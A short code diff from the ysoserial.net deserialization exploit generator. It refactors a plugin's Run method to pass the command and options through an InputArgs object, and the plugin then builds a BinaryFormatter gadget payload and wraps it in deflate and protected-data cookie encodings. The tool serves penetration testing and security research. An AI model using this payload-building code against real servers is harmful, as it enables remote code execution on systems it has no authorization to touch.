@@ -59,10 +59,15 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.Test = test;
             }
             catch (OptionException e)
             {
@@ -92,7 +97,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
+            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
             DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
             ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform();
             byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
